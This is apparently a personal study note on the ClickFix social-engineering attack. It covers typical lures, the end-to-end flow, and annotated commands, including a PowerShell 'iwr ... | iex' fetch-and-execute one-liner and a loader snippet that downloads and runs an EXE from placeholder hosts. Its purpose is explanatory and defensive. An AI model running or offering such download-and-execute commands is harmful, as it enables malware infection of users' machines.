ClickFix:
  ClickFix is a social engineering driven + script based attack, in which the attacker lures the victim
  to run the suspicious/malicious commands into RunDiagnol/Powershell/CMD Terminal via Email/compromised
  websites that to Malware(typically InfoStealer, RAT, Loader, Cobaltstrike, Lumma,RedLine,AsyncRAT)

  ==> So Basically, Instead of exploiting softwares, the user executes malicious commands themselves. this attack pattern bypass the
      security controls like email filters/firewalls

    Typical lure will be
    - Fix your PC
    - Update Browsers
    - Install codec
    - Captcha Verification
    - Zoom audio fix...
      Victim copies command --> runs it --> Malware downloads.
======================================
ClickFix Attack Flow (End - to - End )
=======================================
Website / Email lure
        ↓
Fake instruction "Press Win + R" or "Press ctrl+X, press I" [ shortcut to open powershell/cmd prompt]
        ↓
User pastes command [ctrl+ v] ==> paste clipboard command in terminal
        ↓
PowerShell / CMD executes
        ↓
Payload downloaded
        ↓
Second stage executed
        ↓
Persistence / C2 connection
==========================================

Technical Breakdown:
-------------------------------
1. Initial Access (User Trick)
--------------------------------
Press Windows + R
Paste below:
powershell -c "iwr http://malicious.site/file.ps1 | iex"

user runs --> Powershell executes

Breakdown of command:
Powershell                  ==> Launches Powershell
-c""                        ==> run the command that are in strings & exit
iwr                         ==> Invoke-WebRequest (Fetch data/information)
|                           ==> Pipe output
iex                         ==> Invoke-Expression (Execute whatever is inside strings)there in strings). runs in same process

Download script & execute immediately.
--------------------------------------
2. Stage 1 Loader (Downloader)
--------------------------------------
This script usually:
  - Checks sandbox
  - uses token parameters
  - Downloads second payload

Ex: 
$u="http://site/payload.exe"
Invoke-WebRequest $u -OutFile $env:TEMP\file.exe
Start-Process $env:TEMP\file.exe [launches new process ]

Meaning:
  download EXE
  save temp
  execute

